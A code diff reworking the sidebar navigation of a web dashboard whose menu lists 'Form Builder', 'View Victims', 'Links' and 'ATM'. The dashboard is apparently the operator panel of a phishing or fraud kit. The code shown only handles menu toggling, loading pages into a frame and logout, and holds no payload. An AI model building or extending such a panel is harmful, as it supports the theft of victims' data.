@@ -48,25 +48,6 @@
     color: #fff;
   }
 
-  /* Toggle button */
-  #menuToggle {
-    position: fixed;
-    top: 15px;
-    left: 15px;
-    font-size: 24px;
-    background: lime;
-    color: black;
-    padding: 8px 14px;
-    border-radius: 6px;
-    font-weight: bold;
-    cursor: pointer;
-    z-index: 2100;
-    transition: background 0.2s;
-  }
-  #menuToggle:hover {
-    background: #00cc00;
-  }
-
   /* Header inside sidebar */
   #sidebar h2 {
     color: #0f0;
@@ -77,20 +58,43 @@
   }
 </style>
 
-<div id="menuToggle" onclick="toggleMenu()">☰</div>
-
 <div id="sidebar">
   <h2>⚡ User Panel</h2>
-  <a href="#" onclick="parent.loadPage('home.html')">🏠 Home</a>
-  <a href="#" onclick="parent.loadPage('form-builder.html')">📝 Form Builder</a>
-  <a href="#" onclick="parent.loadPage('victims.html')">👀 View Victims</a>
-  <a href="#" onclick="parent.loadPage('links.html')">🔗 Links</a>
-  <a href="#" onclick="parent.loadPage('atm.html')">🏦 ATM</a>
-  <a href="#" onclick="parent.logout()" class="logout">🚪 Logout</a>
+  <a href="#" data-page="home.html">🏠 Home</a>
+  <a href="#" data-page="form-builder.html">📝 Form Builder</a>
+  <a href="#" data-page="victims.html">👀 View Victims</a>
+  <a href="#" data-page="links.html">🔗 Links</a>
+  <a href="#" data-page="atm.html">🏧 ATM</a>
+  <a href="#" class="logout">🚪 Logout</a>
 </div>
 
 <script>
+  // Toggle sidebar
   function toggleMenu() {
     document.getElementById('sidebar').classList.toggle('active');
   }
+
+  // Handle clicks on all links except logout
+  const links = document.querySelectorAll('#sidebar a[data-page]');
+  links.forEach(link => {
+    link.addEventListener('click', (e) => {
+      e.preventDefault();
+      const page = link.getAttribute('data-page');
+      // Tell parent dashboard to load page in iframe
+      if (window.parent && window.parent.loadPage) {
+        window.parent.loadPage(page);
+      } else if (window.parent && window.parent.document.getElementById('dashboardFrame')) {
+        window.parent.document.getElementById('dashboardFrame').src = page;
+      }
+    });
+  });
+
+  // Handle logout
+  const logoutLink = document.querySelector('#sidebar a.logout');
+  logoutLink.addEventListener('click', (e) => {
+    e.preventDefault();
+    if (window.parent && window.parent.logout) {
+      window.parent.logout();
+    }
+  });
 </script>
